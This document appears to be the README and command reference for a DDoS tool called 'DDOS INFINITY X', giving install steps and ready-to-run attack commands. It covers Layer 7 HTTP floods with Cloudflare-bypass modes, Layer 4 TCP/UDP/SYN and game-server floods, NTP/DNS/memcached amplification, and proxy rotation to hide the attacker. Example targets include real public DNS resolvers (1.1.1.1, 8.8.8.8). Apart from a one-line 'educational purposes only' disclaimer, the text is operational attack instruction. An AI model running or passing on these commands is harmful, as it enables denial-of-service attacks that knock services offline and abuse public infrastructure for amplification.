# DDOS INFINITY X — All Commands

**Repository:** https://github.com/Infinity-X202/DDOS-INFINITY-X  
**Author:** adil fayyaz

---

## Kali Linux — install (recommended)

```bash
cd ~
rm -rf DDOS-INFINITY-X
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 start.py HELP
```

**New terminal:**

```bash
cd ~/DDOS-INFINITY-X
source venv/bin/activate
python3 start.py HELP
```

## Other systems

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
pip3 install -r requirements.txt
python3 start.py HELP
```

---

## General commands

| Command | Description |
|---------|-------------|
| `python3 start.py HELP` | Show all methods and syntax |
| `python3 start.py tools` | Open tools console |
| `python3 start.py STOP` | Stop all attacks |
| `python3 start.py MENU` | Menu **1 2 3 4** (Invio = opzione 1, attacco GET) |
| `python3 start.py 1 <url>` | L7 veloce (GET, defaults) |
| `python3 start.py 2 <ip:port>` | L4 veloce (TCP, defaults) |

---

## Layer 7 — syntax

```bash
python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> [debug]
```

### Examples

```bash
python3 start.py GET http://example.com 0 1000 http.txt 10 100
python3 start.py POST http://example.com 1 500 http.txt 5 60
python3 start.py CFB https://example.com 0 800 http.txt 10 120
python3 start.py BYPASS http://example.com 0 1000 http.txt 10 60
python3 start.py SLOW http://example.com 0 200 http.txt 1 300
```

### Layer 7 methods

`CFB` `BYPASS` `GET` `POST` `OVH` `STRESS` `DYN` `SLOW` `HEAD` `NULL` `COOKIE` `PPS` `EVEN` `GSB` `DGB` `AVB` `CFBUAM` `APACHE` `XMLRPC` `BOT` `BOMB` `DOWNLOADER` `KILLER` `TOR` `RHEX` `STOMP`

---

## Layer 4 — syntax

```bash
python3 start.py <method> <ip:port> <threads> <duration>
```

### Examples

```bash
python3 start.py TCP 1.1.1.1:80 500 60
python3 start.py UDP 8.8.8.8:53 300 30
python3 start.py SYN 192.168.1.1:443 400 45
python3 start.py MINECRAFT 10.0.0.5:25565 100 120
```

### Layer 4 methods

`TCP` `UDP` `SYN` `VSE` `MINECRAFT` `MCBOT` `CONNECTION` `CPS` `FIVEM` `FIVEM-TOKEN` `TS3` `MCPE` `ICMP` `OVH-UDP`

**Amplification** (lab only): `MEM` `NTP` `DNS` `ARD` `CLDAP` `CHAR` `RDP`

```bash
python3 start.py NTP 1.1.1.1:123 500 60 reflectors.txt
```

---

## Layer 4 with proxies

```bash
python3 start.py <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
```

### Example

```bash
python3 start.py TCP 1.1.1.1:80 500 60 5 http.txt
python3 start.py CONNECTION 1.1.1.1:80 200 60 4 http.txt
```

---

## Proxy types (socks_type)

| Value | Type |
|-------|------|
| 0 | ALL (from config.json) |
| 1 | HTTP |
| 4 | SOCKS4 |
| 5 | SOCKS5 |
| 6 | RANDOM |

Proxy file path: `files/proxies/http.txt` (can be empty — auto-download from config)

---

## Tools console

```bash
python3 start.py tools
```

Inside tools: `PING` `CHECK` `DSTAT` `DNS` `TSSRV` `INFO` `HELP` `CLEAR` `EXIT`

---

## Docker

```bash
docker compose build
docker compose run -it --entrypoint /bin/bash infinityx
python start.py HELP
```

---

## Disclaimer

For educational purposes only. Use only on systems you own or have written permission to test.
